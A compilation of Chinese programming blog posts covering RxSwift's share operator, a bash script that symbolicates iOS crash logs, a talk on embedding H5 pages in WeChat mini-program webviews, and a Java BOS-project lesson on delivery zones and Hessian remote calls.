如果所需行为是基础序列继续产生元素，则需要某些版本的 retry 操作符。
Sharing subscription
你通常希望在 UI 层中共享订阅，你不希望单独的 HTTP 调用将相同的数据绑定到多个 UI 元素。
假设你有这样的代码：
let searchResults = searchText
    .throttle(0.3, $.mainScheduler)
    .distinctUntilChanged
    .flatMapLatest { query in
        API.getSearchResults(query)
            .retry(3)
            .startWith([]) // clears results on new search term
            .catchErrorJustReturn([])
    }
    .share(replay: 1)    // <- notice the `share` operator
你通常想要的是在计算后共享搜索结果，这就是 share 的含义。
在 UI 层中，在转换链的末尾添加 share 通常是一个很好的经验法则。因为你想要共享计算结果，而不是把 searcResults 绑定到多个 UI 元素时，触发多个 HTTP 连接。
另外，请参阅 Driver，它旨在透明地包装这些 share 调用，确保在主 UI 县城上观察元素，并且不会将错误绑定到 UI。

原文为RxSwift/Getting Started，本文在原文基础上依自身需要略有修改。

********************************************************************************************************************************************************************************************************
脚本处理iOS的Crash日志
背景
当我们打包app时，可以选择生成对应的符号表，其保存 16 进制函数地址映射信息，通过给定的函数起始地址和偏移量，可以对应函数具体信息以供分析。
所以我们拿到测试给的闪退日志(.crash)时，需要找到打包时对应生成的符号表(.dSYM)作为钥匙解析。具体分为下面几个步骤

dwarfdump --uuid 命令获取 .dSYM 的 uuid
打开 .crash 文件，在特定位置找到 uuid
根据 arm 版本比对两者是否一致
到 Xcode 目录下寻找 symbolicatecrash 工具

不同版本文件路径不同，具体版本请谷歌。Xcode9路径是/Applications/Xcode.app/Contents/SharedFrameworks/DVTFoundation.framework/Versions/A/Resources/

设置终端环境变量
export DEVELOPER_DIR="/Applications/Xcode.app/Contents/Developer"
使用 symbolicatecrash 工具解析日志
symbolicatecrash .crash .dsym > a.out

虽然过程不复杂，但是每次都需要手动执行一次检查与命令，过于繁琐，所以决定用脚本化提高效率。
___
步骤实现
输入Crash日志
#要求输入crash文件路径
inputFile 'Please Input Crash File' 'crash'
crashPath=$filePath
由于需要输入两种不同后缀的文件路径，且都需要检查，因此统一定义一个方法。
#定义全局变量
filePath=
#输入文件路径
inputFile() {
    readSuccess=false
    #首先清空变量值
    filePath=
    while [ $readSuccess = false ]; do 
        echo $1
        #读取到变量中
        read -a filePath
        if [[ ! -e $filePath || ${filePath##*.} != $2 ]]; then
            echo "Input file is not ."$2
        else
            readSuccess=true
        fi
    done
}
.dSYM 是文件夹路径，所以这里简单的判断了路径是否存在，如果不存在就继续让用户输入。

Shell命令中判断分为[]与[[]]，后者比前者更通用，可以使用 || 正则运算等。
判断中，-f表示检查是否存在该文件，-d表示检查是否存在文件夹，-e表示检查是否存在该路径

输入dSYM符号表
dsymSuccess=false
while [ $dsymSuccess = false ]; do
    #要求输入dSYM文件路径
    inputFile 'Please Input dSYM File' 'dSYM'
    dsymPath=$filePath
    #检查是否匹配
    checkUUID "$crashPath" "$dsymPath"
    match=$?
    if [ $match -eq 0 ]; then
        echo 'UUID not match!'
    else
        dsymSuccess=true
    fi
done
循环获取匹配 UUID 的 dSYM ，这里使用了另一种方法获取方法返回值，具体之后章节会总结。
查找symbolicatecrash工具
在 Xcode 文件夹指定路径下查找工具，加快效率，如果没找到就停止运行。
# 查找symbolicatecrash解析工具，内置在Xcode的库文件中
toolPath=`find /Applications/Xcode.app/Contents/SharedFrameworks -name symbolicatecrash | head -n 1`
if [ ! -f $toolPath ]; then
    echo "Symbolicatecrash not exist!"
    exit 0
fi
执行解析命令
#先设置环境变量
export DEVELOPER_DIR="/Applications/Xcode.app/Contents/Developer"
#指定解析结果路径
crashName=`basename $crashPath`
afterPath="$(dirname "$crashPath")"/"${crashName%%.*}""_after.crash"
#开始解析
$toolPath "$crashPath" "$dsymPath" > "$afterPath" 2> /dev/null 
这里我将错误信息导流到 /dev/null，保证解析文件没有杂乱信息。

遇到的问题
怎么获取函数返回值？
之前没有处理过需要返回数值的方法，所以一开始有点懵，查询资料后最终采用了两种方式实现了效果，现在做一些总结。
全局变量记录
#定义全局变量
filePath=
inputFile() {
    #读取到变量中
    read -a filePath
}
inputFile
crashPath=$filePath
通过 inputFile 方法来了解一下，首先定义一个全局变量为 filePath，在方法中重新赋值，方法结束后读取全局变量中的数据。
这种方法的好处是可以自定义返回参数类型和个数，缺点是容易和其他变量搞混。
Return返回值
类似与C语言中的用法，脚本也支持 retrun 0 返回结果并停止运行。
checkUUID() {
    grep "$arm64id" "$1"
    if [ $? -ne 0 ]; then
        return 1;
    fi
    return 0;
}
checkUUID "$crashPath" "$dsymPath"
match=$?
获取结果的方式为 $?，其能够返回环境中最后一个指令结果，也就是之前执行的checkUUID的结果。
优点是简洁明了，符合编码习惯，缺点是返回值只能是 0-255 的数字，不能返回其他类型的数据。
获取打印值
还有一种方法其实平时一直在使用，只不过并不了解其运行方式。
crashName=`basename $crashPath`

print() {
    echo "Hello World"
}
text=$(print)
运行系统预设的方法或者自定义方法，将执行命令用 $() 的方式使用，就可以获取该命令中所有打印的信息，赋值到变量就可以拿到需要的返回值。
优点是功能全效率高，使用字符串的方式可以传递定制化信息，缺点是不可预期返回结果，需要通过字符串查找等命令辅助。
循环输入合法路径
在我的设想中，需要用户输入匹配的 dSYM 文件路径，如果不匹配，则重新输入，直到合法。为了支持嵌套，需要定义局部变量控制循环，具体代码如下
dsymSuccess=false
while [ $dsymSuccess = false ]; do
    #要求输入dSYM文件路径
    inputFile 'Please Input dSYM File' 'dSYM'
    dsymPath=$filePath
    #检查是否匹配
    checkUUID "$crashPath" "$dsymPath"
    match=$?
    if [ $match -eq 0 ]; then
        echo 'UUID not match!'
    else
        dsymSuccess=true
    fi
done
### 处理字符串
获取到 UUID 所有输出信息后，需要截取出对应平台的信息，处理还是不太熟悉，特地整理如下
#原始信息
UUID: 92E495AA-C2D4-3E9F-A759-A50AAEF446CD (armv7) /Volumes/.dSYM/Contents/Resources/DWARF/app
UUID: 536527A8-0243-34DB-AE08-F1F64ACA4351 (arm64) /Volumes/.dSYM/Contents/Resources/DWARF/app

#去除中间间隔-
uuid=${uuid//-/}

#从后往前找第一个匹配 \(arm64的，并且都删除
arm64id=${uuid% \(arm64*}
#处理后
UUID: 92E495AAC2D43E9FA759A50AAEF446CD (armv7) /Volumes/.dSYM/Contents/Resources/DWARF/app
UUID: 536527A8024334DBAE08F1F64ACA4351

#从前往后找最后一个UUID: ，并删除
arm64id=${arm64id##*UUID: }
#处理后 
536527A8024334DBAE08F1F64ACA4351

总结
看似简单的脚本，也花了一天时间编写，总体还是不太熟练，仍需努力联系。
这次特地尝试了与上次不同的参数输入方法，使用提示输入的方式，果然遇到了新的问题。好在都查资料解决了，结果还算满意。
脚本我提交到了Github，欢迎大家指教共同进步！给个关注最好啦～

********************************************************************************************************************************************************************************************************
小程序webview实践
小程序webview实践 -- 张所勇

大家好，我是转转开放业务部前端负责人张所勇，今天主要来跟大家分享小程序webview方面的问题，但我并不会讲小程序的webview原理，而我主要想讲的是小程序内如何嵌入H5。
那么好多同学会想了，不就是用web-view组件就可以嵌入了吗，是的，如果咱们的小程序和H5的业务比较简单，那直接用webview接入就好了，但我们公司的h5除小程序之外，还运行在转转app、58app、赶集app等多个端，如何能实现一套代码在多端运行，这是我今天主要想分享的，因此今天分享更适合h5页面比较复杂，存在多端运行情况的开发者，期待能给大家提供一些多端兼容的思路。

下面我先跟大家介绍下今天演讲主要的提纲。

小程序技术演进
webview VS 小程序
h5多端兼容方案
小程序sdk设计
webview常见问题

1 转转小程序演进过程

相信在座的很多同学的产品跟转转小程序经历了类似的发展过程，我们转转小程序是从去年五月份开始开发的，那时候也是小程序刚出来不久，我们就快速用原生语法搭建了个demo，功能很简单，就是首页列表页详情页。
然后我们从7月份开始进入了第二个阶段，这时候各种中大型公司已经意识到了，借助微信的庞大用户群，小程序是一个很好的获客渠道，因此我们也从demo阶段正式的开始了小程序开发。

那时候我们整个团队从北京跑到广州的微信园区里面去封闭开发，我们一方面在做小程序版本的转转，实现了交易核心流程，苦苦的做了两三个月，DAU始终也涨不上去，另一方面我们也在做很多营销活动的尝试，我们做了一款简单的测试类的小游戏，居然几天就刷屏了，上百万的pv，一方面我们很欣喜，另一方面也很尴尬，因为大家都是来玩的，不是来交易的，所以我们就开始了第三阶段。
这个阶段我们进行了大量的开发工作，让我们的小程序功能和体验接近了转转APP，那到了今年6月份，我们的小程序进入了微信钱包里面，我们的DAU峰值也达到了千万级别，这时候可以说已经成为了一个风口上的新平台，这个时候问题来了，公司的各条线业务都开始想接入到小程序里面。

于是乎就有了上面这段对话。
所以，为了能够更好接入各业务线存量h5页面和新的活动页，我们开始着手进行多端适配的工作。
那我们会考虑三种开发方案（我这里只说缺点）

在webview这个组件出来以前，我们是采用第一种方案，用纯小程序开发所有业务页面，那么适合的框架有现在主流的三种，wepy，mpvue、taro，缺点是不够灵活，开发成本巨大，真的很累，尤其是业务方来找我们想介入小程序，但他们的开发者又不会小程序，当时又不能嵌入H5，所以业务方都希望我们来开发，所有业务都来找，你们可以想想成本又多高，这个方案肯定是不可行，第二种方案，就是一套代码编译出多套页面，在不同端运行，mpvue和taro都可以，我们公司有业务团队在使用mpvue，编译出来的结果不是特别理性，一是性能上面没有达到理想的状态，二是api在多端兼容上面二次改造的成本很高，各个端api差异很大，如果是一个简单的活动页还好，但如果是一个跟端有很大功能交互的页面，那这种方式其实很难实现。
那我们采用的是第三种方案，目前我们的小程序是作为一个端存在，像app一样，我们只做首页、列表、详情、购买等等核心页面都是用小程序开发，每个业务的页面、活动运营页面都是H5，并且用webview嵌入，这样各个业务接入的成本非常低，但这也有缺点，1是小程序与h5交互和通信比较麻烦，二是我们的app提供了很大功能支持，这些功能在小程序里面都需要对应的实现
2 webview VS 小程序

这张图是我个人的理解。（并不代表微信官方的看法）
把webview和小程序在多个方面做了比对。
3 h5多端兼容方案

未来除了小程序之外，可能会多的端存在，比如智能小程序等等，那我们期望的结果是什么呢，就是一套H5能运行于各个环境内。

这可能是最差的一个case，h5判断所在的环境，去调用不同api方法，这个case的问题是，业务逻辑特别复杂，功能耦合非常严重，也基本上没有什么复用性。

那我们转转采取的是什么方案呢？
分三块，小程序端，用WePY框架，H5这块主要是vue和react，中间通过一个adapter来连接。我们转转的端特别多，除了小程序还包括纯转转app端，58端，赶集端，纯微信端，qq端，浏览器端，所以H5页面需要的各种功能，在每个端都需要对应的功能实现，比如登录、发布、支付、个人中心等等很多功能，这些功能都需要通过adapter这个中间件进行调用，接下来详细来讲。

我这里就不贴代码了，我只讲下adapter的原理，首先adapter需要初始化，做两件事情，一是产出一个供h5调用的native对象，二是需要检测当前所处的环境，然后根据环境去异步加载sdk文件，这里的关键点是我们要做个api调用的队列，因为sdk加载时异步的过程，如果期间页面内发生了api调用，那肯定得不到正确的响应，因此你要做个调用队列，当sdk初始化完毕之后再处理这些调用，其实adapter原理很简单，如果你想实现多端适配，那么只需要根据所在的环境去加载不同的sdk就可以了。

做好adapter之后，你需要让每个h5的项目都引入adapter文件，并且在调用api的时候，都统一在native对象下面调用。
4 小程序sdk设计

我们总结小程序提供给H5的功能大体分为这四种，第一是基于小程序的五种跳转能力，比如关闭当前页面。

那我们看到小程序提供了这五种跳转方式。

第二是直接使用微信sdk提供的能力，比如扫码，这个比较简单。第三是h5打开小程序的某些页面，这个是最常用的，比如进入下单页等。

对应每个api，小程序这边都需要实现对应的页面功能，大家看这几个图，skipToChat就是进到我们的IM页面，下面依次是进入个人主页，订单详情页，下单页面，其实我们的小程序开发的主要工作也是去做这些基础功能页面，然后提供给H5，各个业务基本都是H5实现，接入到小程序里面来，我们只做一个平台。

这是进入个人主页方法的实现，其实就是进入了小程序profile这个页面。

第四就是h5与小程序直接的通信能力，这个比较集中体现在设置分享信息和登录这块。
4.1 设置分享

上面（adapter）做好了以后，在h5这块调用就一句话就可以了。

小程序和h5 之间的通信基本上常用两种方式，一个是postMessage，这个方法大家都知道，只有在三种情况才可以触发，后退、销毁和分享，但也有个问题，这个方法是基础库1.7.1才开始支持的，1.7.1以下就只能通过第二种方法来传递数据，也就是设置和检测webview组件的url变化，类似pc时代的iframe的通信方式。

sdk这块怎么做呢，定义一个share方法，首先需要检测下基础库版本，看是否支持postMessage，如果支持直接调用，如果不支持，把分享参数拼接到url当中，然后进行一次重载，所以说通过url传递数据有个缺点，就是页面可能需要刷新一次才能设置成功。

我们看下分享信息设置这块，小程序这端，首先通过bindmessage事件接收h5传回来的数据，然后在用户分享的时候onShareAppMessage判断有没有回传的数据，如果没有就到webviewurl当中取，否则就是用默认分享数据。

h5调分享这块，我们也做了一些优化，传统方式是要四步才能掉起分享面板，点页面里的某个按钮，然后给用户个提示层，用户再去点右上角的点点点，再点转发，才能拉起分享面板。

我们后来改成了这样，点分享按钮，把分享信息带到一个专门的小程序页面，这个页面里面放一个button，type=share，点一下就拉起来面板了，虽然是一个小小的改动，但能大幅提高分享成功率的，因为很多用户对右上角的点点点不太敏感。
4.2 登录
接下来我们看看登录功能

分两种情况，接入的H5可能一开始就需要登录态，也可能开始不需要登录态中途需要登录，这两种情况我们约定了h5通过自己的url上一个参数进行控制。

一开始就需要登录态的情况，那么在加载webview之前，首先进行授权登录，然后把登录信息拼接到url里面，再去来加载webview，在h5里面通过adapter来把登录信息提取出来并且存到cookie里，这样h5一进来就是有登陆态的。
一开始不需要登录态的情况，一进入小程序就直接通过webview加载h5，h5调用login方法的时候，把needLogin这个参数拼接到url中，然后利用api进行重载，就走了第一种情况进行授权登录了。

5 webview常见问题
5.1 区分环境
第一是你如何区分h5所在的环境是小程序里面的webview还是纯微信浏览器，为什么要区分呢，因为你的H5在不同环境需要不同的api，比如我们的业务，下单的时候，如果是小程序，那么我们需要进入小程序的下单页，如果是纯微信，我们之间进纯微信的下单页，这两种情况的api实现是不一样的，那么为什么难区分，大家可能知道，小程序的组件分为内置组件和原生组件，内置组件就是小程序定义的view、scroll-view这些基本的标签，原生组件就是像map啊这种，这其实是调用了微信的原生能力，webview也是一种类似原生的组件，为什么说是类似原生的组件，微信并没有为小程序专门做一套webview机制，而是直接用微信本身的浏览器，所以小程序webview和微信浏览器的内核都是一样的，包括UA头都是一模一样，cookie、storage本地存储数据都是互通的，都是一套，因此我们很难区分具体是在哪个环境。

还好微信提供了一个环境变量，但这个变量不是很准确，加载h5以后第一个页面可以及时拿到，但后续的页面都需要在微信的sdk加载完成以后才能拿到，因此建议大家在wx.ready或者是weixinjsbridgeready事件里面去判断，区别就在于前者需要加载jweixin.js才有，但这里有坑，坑在于h5的开发者可能并不知道你这个检测过程需要时间，是一个异步的过程，他们可能页面一加载就需要调用一些api，这时候就可能会出错，因此你一定要提供一个api调用的队列和等待机制。
5.2 支付
第二个常见问题是支付，因为小程序webview里面不支持直接掉起微信支付，所以基本上需要支付的时候，都需要来到小程序里面，支付完再回去。

上面做好了以后，在h5这块调用就一句话就可以了。

我们转转的业务分两种支付情况，一是有的业务h5有自己完善的交易体系，下单动作在h5里面就可以完成，他们只需要小程序付款，因此我们有一个精简的支付页，进来直接就拉起微信支付，还有一种情况是业务需要小程序提供完整的下单支付流程，那么久可以之间进入我们小程序的收银台来，图上就是sdk里面的基本逻辑，我们通过payOnly这个参数来决定进到哪个页面。

我们再看下小程序里面精简支付怎么实现的，就是onload之后之间调用api拉起微信支付，支付成功以后根据h5传回来的参数，如果是个小程序页面，那之间跳转过去，否则就刷新上一个webview页面，然后返回回去。
5.3 formId收集
第三个问题是formId，webview里面没有办法收集formId，这有什么影响呢，没有formId就没法发服务通知，没有服务通知，业务就没办法对新用户进行召回，这对业务来讲是一个很大的损失，目前其实我们也没有很好的方案收集。

我们目前主要通过两种方式收集，访问量比较大的这种webview落地页，我们会做一版小程序的页面或者做一个小程序的中转页，只要用户有任何触摸页面的操作，都可以收集到formid，另外一种就是h5进入小程序页面时候收集，比如支付，IM这些页面，但并不是每个用户都会进到这些页面的，用户可能一进来看不感兴趣，就直接退出了，因此这种方式存在很大的流失。
5.4 左上角返回
那怎么解决这种流失呢，我们加了一个左上角返回的功能，。

首先进入的是一个空白的中转页，然后进入h5页面，这样左上角就会出现返回按钮了，当用户按左上角的返回按钮时候，页面会被重载到小程序首页去，这个看似简单又微小的动作，对业务其实有很大的影响，我们看两个数字，经过我们的数据统计发现，左上角返回按钮点击率高达70%以上，因为这种落地页一般是被用户分享出来的，以前纯h5的时候只能通过左上角返回，所以在小程序里用户也习惯如此，第二个数字，重载到首页以后，后续页面访问率有10%以上，这两个数字对业务提升其实蛮大的。

其实现原理很简单，都是通过第二次触发onShow时进行处理。
以上就是我今天全部演讲的内容，谢谢大家！

这是我们“大转转FE”的公众号。里面发表了很多FE和小程序方向的原创文章。感兴趣的同学可以关注一下，如果有问题可以在文章底部留言，我们共同探讨。
同时也感谢掘金举办了这次大会，让我有机会同各位同仁进行交流。在未来的前端道路上，与大家共勉！

********************************************************************************************************************************************************************************************************
day53_BOS项目_05


今天内容安排：

1、添加定区
2、定区分页查询
3、hessian入门 --> 远程调用技术
4、基于hessian实现定区关联客户



1、添加定区
定区可以将取派员、分区、客户信息关联到一起。页面：WEB-INF/pages/base/decidedzone.jsp




第一步：使用下拉框展示取派员数据，需要修改combobox的URL地址，发送请求
    <tr>        <td>选择取派员</td>        <td>            <input class="easyui-combobox" name="staff.id"                  data-options="valueField:'id',textField:'name',                    url:'${pageContext.request.contextPath}/staffAction_listajax.action'" />          </td>    </tr>
浏览器效果截图：
第二步：在StaffAction中提供listajax()方法，查询没有作废的取派员，并返回json数据
    /**     * 查询没有作废的取派员，并返回json数据     * @return     * @throws IOException      */    public String listajax() throws IOException {        List<Staff> list = staffService.findListNoDelete();        String[] excludes = new String[] {"decidedzones"}; // 我们只需要Staff的id和name即可，其余的都不需要，本例中我们只排除关联的分区对象        this.writeList2Json(list, excludes);        return "none";    }
第三步：在StaffService中提供方法查询没有作废的取派员
    /**     * 查询没有作废的取派员，即查询条件：deltag值为“0”     */    public List<Staff> findListNoDelete() {        // 创建离线条件查询对象        DetachedCriteria detachedCriteria = DetachedCriteria.forClass(Staff.class);        // 向离线条件查询对象中封装条件        detachedCriteria.add(Restrictions.eq("deltag", "0"));        return staffDao.findByCriteria(detachedCriteria);    }
第四步：在IBaseDao中提供通用的条件查询方法IBaseDao.java
    // 条件查询（不带分页）    public List<T> findByCriteria(DetachedCriteria detachedCriteria);
BaseDaoImpl.java
    /**     * 通用条件查询（不带分页）     */    public List<T> findByCriteria(DetachedCriteria detachedCriteria) {        return this.getHibernateTemplate().findByCriteria(detachedCriteria);    }
浏览器效果截图：
第五步：使用数据表格datagrid展示未关联到定区的分区数据decidedzone.jsp
    <td valign="top">关联分区</td>    <td>        <table id="subareaGrid"  class="easyui-datagrid" border="false" style="width:300px;height:300px"                 data-options="url:'${pageContext.request.contextPath}/subareaAction_listajax.action',                fitColumns:true,singleSelect:false">            <thead>                  <tr>                      <th data-options="field:'id',width:30,checkbox:true">编号</th>                      <th data-options="field:'addresskey',width:150">关键字</th>                      <th data-options="field:'position',width:200,align:'right'">位置</th>                  </tr>              </thead>         </table>    </td>
浏览器效果截图：
第六步：在SubareaAction中提供listajax()方法，查询未关联到定区的分区数据，并返回json数据
    /**     * 查询未关联到定区的分区数据，并返回json数据     * @return     * @throws IOException      */    public String listajax() throws IOException {        List<Subarea> list = subareaService.findListNotAssociation();        String[] excludes = new String[] {"region", "decidedzone"}; // 本例中我们只排除关联的区域对象和定区对象        this.writeList2Json(list, excludes);        return "none";    }
Service层代码：
    /**     * 查询未关联到定区的分区数据，即查询条件：decidedzone值为“null”     */    public List<Subarea> findListNotAssociation() {        // 创建离线条件查询对象        DetachedCriteria detachedCriteria = DetachedCriteria.forClass(Subarea.class);        // 向离线条件查询对象中封装条件        // detachedCriteria.add(Restrictions.eq("decidedzone", "null")); // 基本类型的属性使用eq()和ne()        detachedCriteria.add(Restrictions.isNull("decidedzone")); // 引用类型的属性使用isNull()和isNotNull()        return subareaDao.findByCriteria(detachedCriteria);    }
浏览器效果截图：
第七步：为添加/修改定区窗口中的保存按钮绑定事件
    <!-- 添加/修改分区 -->    <div style="height:31px;overflow:hidden;" split="false" border="false" >        <div class="datagrid-toolbar">            <a id="save" icon="icon-save" href="#" class="easyui-linkbutton" plain="true" >保存</a>            <script type="text/javascript">                $(function() {                    $("#save").click(function() {                        var v = $("#addDecidedzoneForm").form("validate");                        if (v) {                            $("#addDecidedzoneForm").submit(); // 页面会刷新                            // $("#addDecidedzoneForm").form("submit"); // 页面不会刷新                        }                    });                });            </script>        </div>    </div>
第八步：提交上面的添加定区的表单，发现id名称冲突浏览器截图：




代码截图：即：关联分区中的复选框的field的名称叫id，定区编码的name名称也叫id，造成冲突，服务器不能够区分开他们哪个id是定区，还是哪个id是分区，如何解决呢？答：我们应该类比于选择取派员的name的名称staff.id这样，如上图绿色框框中的那样，即我们可以把关联分区中的复选框的field的名称改为subareaid。即：我们要在Subarea类中提供getSubareaid()方法，就相当于给Subarea类中的字段id重新起个名字，这样返回的json数据中就含有subareaid字段了。Subarea.java改过之后，浏览器截图：第十步：创建定区管理的Action，提供add()方法保存定区，提供subareaid数组属性接收多个分区的subareaid
package com.itheima.bos.web.action;import org.springframework.context.annotation.Scope;import org.springframework.stereotype.Controller;import com.itheima.bos.domain.Decidedzone;import com.itheima.bos.web.action.base.BaseAction;/** * 定区设置 * @author Bruce * */@Controller@Scope("prototype")public class DecidedzoneAction extends BaseAction<Decidedzone> {    // 采用属性驱动的方式，接收页面提交过来的参数subareaid（多个，需要用到数组进行接收）    private String[] subareaid;    public void setSubareaid(String[] subareaid) {        this.subareaid = subareaid;    }    /**     * 添加定区     * @return     */    public String add() {        decidedzoneService.save(model, subareaid);        return "list";    }}
Service层代码：
package com.itheima.bos.service.impl;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service;import org.springframework.transaction.annotation.Transactional;import com.itheima.bos.dao.IDecidedzoneDao;import com.itheima.bos.dao.ISubareaDao;import com.itheima.bos.domain.Decidedzone;import com.itheima.bos.domain.Subarea;import com.itheima.bos.service.IDecidedzoneService;@Service@Transactionalpublic class DecidedzoneServiceImpl implements IDecidedzoneService {    // 注入dao    @Autowired    private IDecidedzoneDao decidedzoneDao;    // 注入dao    @Autowired    private ISubareaDao subareaDao;    /**     * 添加定区     */    public void save(Decidedzone model, String[] subareaid) {        // 先保存定区表        decidedzoneDao.save(model);        // 再修改分区表的外键，java代码如何体现呢？答：让这两个对象关联下即可。谁关联谁都行。        // 但是在关联之前，我们应该有意识去检查下通过反转引擎自动生成出来的Hibernate配置文件中，谁放弃了维护外键的能力。        // 一般而言：是“一”的一方放弃。所以需要由“多”的一方来维护外键关系。        for (String sid : subareaid) {            // 根据分区id把分区对象查询出来，再让分区对象去关联定区对象model            Subarea subarea = subareaDao.findById(sid); // 持久化对象            // 分区对象 关联 定区对象 --> 多方关联一方            subarea.setDecidedzone(model); // 关联完之后，会自动更新数据库，根据快照去对比，看看我们取出来的持久化对象是否跟快照长得不一样，若不一样，就刷新缓存。            // 从效率的角度讲：我们应该拼接一个HQL语句去更新Subarea，而不是去使用Hibernate框架通过关联的方式更新            // HQL：update Subarea set decidedzone=? where id=? -->            // SQL：update bc_subarea set decidedzone_id=? where id=?        }    }}
第十一步：配置struts.xml
    <!-- 定区管理：配置decidedzoneAction-->    <action name="decidedzoneAction_*" class="decidedzoneAction" method="{1}">        <result name="list">/WEB-INF/pages/base/decidedzone.jsp</result>    </action>
2、定区分页查询
第一步：decidedzone.jsp页面修改datagrid的URL
    // 定区标准数据表格    $('#grid').datagrid( {        iconCls : 'icon-forward',        fit : true,        border : true,        rownumbers : true,        striped : true,        pageList: [30,50,100],        pagination : true,        toolbar : toolbar,        url : "${pageContext.request.contextPath}/decidedzoneAction_pageQuery.action",        idField : 'id',        columns : columns,        onDblClickRow : doDblClickRow    });
第二步：在DecidedzoneAction中提供分页查询方法
    /**     * 分页查询     * @return     * @throws IOException      */    public String pageQuery() throws IOException {        decidedzoneService.pageQuery(pageBean);        String[] excludes = new String[] {"currentPage", "pageSize", "detachedCriteria", "subareas", "decidedzones"};        this.writePageBean2Json(pageBean, excludes);        return "none";    }
第三步：修改Decidedzone.hbm.xml文件，取消懒加载

3、hessian入门 --> 远程调用技术


Hessian是一个轻量级的 remoting on http 工具，使用简单的方法提供了RMI(Remote Method Invocation 远程方法调用)的功能。相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议(Remote Procedure Call Protocol 远程过程调用协议)，因为采用的是二进制协议，所以它很适合于发送二进制数据。


常见的远程调用的技术：

1、webservice（CXF框架、axis框架），偏传统，基于soap（简单对象访问协议）协议，传输的是xml格式的数据，数据冗余比较大，传输效率低。现在也支持json。
2、httpclient --> 电商项目：淘淘商城，大量使用
3、hessian --> http协议、传输的是二进制数据，冗余较少，传输效率较高。
4、dubbo --> 阿里巴巴



Dubbo是阿里巴巴SOA服务化治理方案的核心框架，每天为2,000+个服务提供3,000,000,000+次访问量支持，并被广泛应用于阿里巴巴集团的各成员站点。自开源后，已有不少非阿里系公司在使用Dubbo。


Tengine是由淘宝网发起的Web服务器项目。它在Nginx的基础上，针对大访问量网站的需求，添加了很多高级功能和特性。Tengine的性能和稳定性已经在大型的网站如淘宝网，天猫商城等得到了很好的检验。它的最终目标是打造一个高效、稳定、安全、易用的Web平台。


hessian有两种发布服务的方式：

1、使用hessian框架自己提供的HessianServlet发布：com.caucho.hessian.server.HessianServlet
2、和spring整合发布服务：org.springframework.web.servlet.DispatcherServlet



hessian入门案例


服务端开发：第一步：创建一个java web项目，并导入hessian的jar包第二步：创建一个接口
    public interface HelloService {        public String sayHello(String name);        public List<User> findAllUser();    }
第三步：提供上面接口的实现类
    public class HelloServiceImpl implements HelloService {        public String sayHello(String name) {            System.out.println("sayHello方法被调用了");            return "hello " + name;        }        public List<User> findAllUser() {            List<User> list = new ArrayList<User>();            list.add(new User(1, "小艺"));            list.add(new User(2, "小军"));            return list;        }    }
第四步：在web.xml中配置服务
    <servlet>        <servlet-name>hessian</servlet-name>        <servlet-class>com.caucho.hessian.server.HessianServlet</servlet-class>        <init-param>            <param-name>home-class</param-name>            <param-value>com.itheima.HelloServiceImpl</param-value>        </init-param>        <init-param>            <param-name>home-api</param-name>            <param-value>com.itheima.HelloService</param-value>        </init-param>    </servlet>    <servlet-mapping>        <servlet-name>hessian</servlet-name>        <url-pattern>/hessian</url-pattern>    </servlet-mapping>
客户端开发：第一步：创建一个客户端项目(普通java项目即可)，并导入hessian的jar包第二步：创建一个接口（和服务端接口对应）
    public interface HelloService {        public String sayHello(String name);        public List<User> findAllUser();    }
第三步：使用hessian提供的方式创建代理对象调用服务
public class Test {    public static void main(String[] args) throws MalformedURLException {        // 通过hessian提供的工厂类创建一个代理对象，通过这个代理对象可以远程调用服务        HessianProxyFactory factory = new HessianProxyFactory();        HelloService proxy = (HelloService) factory.create(HelloService.class, "http://localhost:8080/hessian_server/hessian");        String ret = proxy.sayHello("test");        System.out.println(ret);        List<User> list = proxy.findAllUser();        for (User user : list) {            System.out.println(user.getId() + "---" + user.getName());        }    }}
4、基于hessian实现定区关联客户
4.1、发布crm服务并测试访问
第一步：创建动态的web项目crm，导入hessian的jar第二步：创建一个crm数据库和t_customer表




第三步：在web.xml中配置spring的DispatcherServlet
    <!-- hessian发布服务的方式：和spring整合发布服务：org.springframework.web.servlet.DispatcherServlet -->    <servlet>        <servlet-name>remoting</servlet-name>        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>        <load-on-startup>1</load-on-startup>    </servlet>    <servlet-mapping>        <servlet-name>remoting</servlet-name>        <url-pattern>/remoting/*</url-pattern>    </servlet-mapping>
第四步：提供接口CustomerService和Customer类、Customer.hbm.xml映射文件CustomerService.java
package cn.itcast.crm.service;import java.util.List;import cn.itcast.crm.domain.Customer;// 客户服务接口 public interface CustomerService {    // 查询未关联定区客户    public List<Customer> findnoassociationCustomers();    // 查询已经关联指定定区的客户    public List<Customer> findhasassociationCustomers(String decidedZoneId);    // 将未关联定区客户关联到定区上    public void assignCustomersToDecidedZone(Integer[] customerIds, String decidedZoneId);}
第五步：为上面的CustomerService接口提供实现类
package cn.itcast.crm.service.impl;import java.util.List;import org.hibernate.Session;import cn.itcast.crm.domain.Customer;import cn.itcast.crm.service.CustomerService;import cn.itcast.crm.utils.HibernateUtils;public class CustomerServiceImpl implements CustomerService {    public List<Customer> findnoassociationCustomers() {        Session session = HibernateUtils.openSession();        session.beginTransaction();        String hql = "from Customer where decidedzone_id is null";        List<Customer> customers = session.createQuery(hql).list();        session.getTransaction().commit();        session.close();        return customers;    }    public List<Customer> findhasassociationCustomers(String decidedZoneId) {        Session session = HibernateUtils.openSession();        session.beginTransaction();        String hql = "from Customer where decidedzone_id=?";        List<Customer> customers = session.createQuery(hql).setParameter(0, decidedZoneId).list();        session.getTransaction().commit();        session.close();        return customers;    }    public void assignCustomersToDecidedZone(Integer[] customerIds, String decidedZoneId) {        Session session = HibernateUtils.openSession();        session.beginTransaction();        // 取消定区所有关联客户        String hql2 = "update Customer set decidedzone_id=null where decidedzone_id=?";        session.createQuery(hql2).setParameter(0, decidedZoneId).executeUpdate();        // 进行关联        String hql = "update Customer set decidedzone_id=? where id=?";        if (customerIds != null) {            for (Integer id : customerIds) {                session.createQuery(hql).setParameter(0, decidedZoneId).setParameter(1, id).executeUpdate();            }        }        session.getTransaction().commit();        session.close();    }}
第六步：在WEB-INF目录提供spring的配置文件remoting-servlet.xml
